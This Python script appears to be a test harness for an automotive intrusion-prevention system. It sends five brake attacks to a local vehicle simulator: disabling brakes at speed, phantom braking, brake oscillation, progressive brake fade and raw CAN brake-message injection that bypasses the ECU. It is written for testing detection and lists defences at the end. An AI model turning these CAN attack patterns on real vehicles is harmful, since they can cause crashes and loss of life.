#!/usr/bin/env python3
"""
Brake Attack Simulation
Demonstrates various brake-related attacks that can compromise vehicle safety
"""

import time
import sys
import os
import requests
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from can_generator import send_ecu_command

def attack_1_brake_failure():
    """Attack 1: Disable brakes when needed"""
    print("🔥 ATTACK 1: Brake Failure Simulation")
    print("   Disabling brakes during high speed...")
    
    # First increase speed
    for i in range(5):
        send_ecu_command(speed_delta=10.0)
        time.sleep(0.2)
    
    print("   Vehicle now at high speed - attempting to disable brakes...")
    
    # Try to apply 0% brake pressure when brakes are needed
    send_ecu_command(brake_pressure=0.0)
    time.sleep(1)
    
    print("   ✅ Attack sent: Brake system disabled")
    print("   🚨 Risk: Vehicle cannot stop at high speed")
    print()

def attack_2_phantom_braking():
    """Attack 2: Sudden unexpected braking"""
    print("🔥 ATTACK 2: Phantom Braking Attack")
    print("   Applying sudden maximum brakes without warning...")
    
    # Sudden 100% brake application
    send_ecu_command(brake_pressure=100.0)
    time.sleep(0.5)
    
    print("   ✅ Attack sent: 100% brake pressure applied")
    print("   🚨 Risk: Sudden stop can cause rear-end collisions")
    print()

def attack_3_brake_oscillation():
    """Attack 3: Rapid brake on/off cycles"""
    print("🔥 ATTACK 3: Brake Oscillation Attack")
    print("   Creating rapid brake on/off cycles...")
    
    for i in range(10):
        brake_pressure = 80.0 if i % 2 == 0 else 0.0
        send_ecu_command(brake_pressure=brake_pressure)
        print(f"   Brake: {brake_pressure}%")
        time.sleep(0.3)
    
    print("   ✅ Attack sent: Brake oscillation pattern")
    print("   🚨 Risk: Vehicle instability and loss of control")
    print()

def attack_4_brake_fade_simulation():
    """Attack 4: Gradual brake degradation"""
    print("🔥 ATTACK 4: Brake Fade Simulation")
    print("   Simulating gradual brake system failure...")
    
    # Gradually reduce brake effectiveness
    for brake_level in [80, 60, 40, 20, 10, 0]:
        send_ecu_command(brake_pressure=brake_level)
        print(f"   Brake effectiveness: {brake_level}%")
        time.sleep(1)
    
    print("   ✅ Attack sent: Progressive brake failure")
    print("   🚨 Risk: Driver unaware of degrading brake performance")
    print()

def attack_5_can_brake_injection():
    """Attack 5: Direct CAN brake message injection"""
    print("🔥 ATTACK 5: Direct CAN Brake Message Injection")
    print("   Bypassing ECU and sending raw brake CAN messages...")
    
    try:
        # Send multiple conflicting brake messages
        for pressure in [100, 0, 50, 100, 0]:
            pressure_int = int(pressure * 10)
            data = [pressure_int // 256, pressure_int % 256, 0, 0, 0, 0, 0, 0]
            
            response = requests.post('http://localhost:5001/api/send-can', 
                                   json={'can_id': 0x140, 'data': data})
            
            if response.status_code == 200:
                print(f"   Injected brake message: {pressure}%")
            else:
                print(f"   Failed to inject brake message: {pressure}%")
            
            time.sleep(0.5)
        
        print("   ✅ Attack sent: Raw CAN brake messages injected")
        print("   🚨 Risk: Bypasses normal ECU safety checks")
        
    except Exception as e:
        print(f"   ❌ CAN injection failed: {e}")
        print("   Using ECU command fallback...")
        send_ecu_command(brake_pressure=100.0)
    
    print()

def main():
    print("⚔️  BRAKE ATTACK SIMULATION")
    print("=" * 60)
    print()
    
    print("🎯 ATTACK SCENARIOS:")
    print("   1. Brake Failure - Disable brakes at high speed")
    print("   2. Phantom Braking - Sudden unexpected braking")
    print("   3. Brake Oscillation - Rapid on/off cycles")
    print("   4. Brake Fade - Gradual brake degradation")
    print("   5. CAN Injection - Direct brake message injection")
    print()
    
    print("🔍 WHAT TO WATCH:")
    print("   • Vehicle speed and brake pressure changes")
    print("   • Trust score response to brake anomalies")
    print("   • IPS system brake containment")
    print("   • ML detection of brake attack patterns")
    print()
    
    print("🚨 SECURITY IMPLICATIONS:")
    print("   • Brake attacks are safety-critical")
    print("   • Can cause accidents and loss of life")
    print("   • Need immediate containment and override")
    print()
    
    input("Press Enter to start brake attacks...")
    print()
    
    attack_1_brake_failure()
    time.sleep(2)
    
    attack_2_phantom_braking()
    time.sleep(2)
    
    attack_3_brake_oscillation()
    time.sleep(2)
    
    attack_4_brake_fade_simulation()
    time.sleep(2)
    
    attack_5_can_brake_injection()
    
    print("=" * 60)
    print("🎯 BRAKE ATTACK SUMMARY:")
    print("✅ All brake attack patterns executed")
    print("🚨 Critical safety systems compromised")
    print("🛡️ Monitor IPS response and containment")
    print()
    print("🔧 RECOMMENDED DEFENSES:")
    print("   • Physics-based brake limits")
    print("   • Brake pressure rate limiting")
    print("   • Emergency brake override")
    print("   • ML-based brake pattern detection")

if __name__ == "__main__":
    main()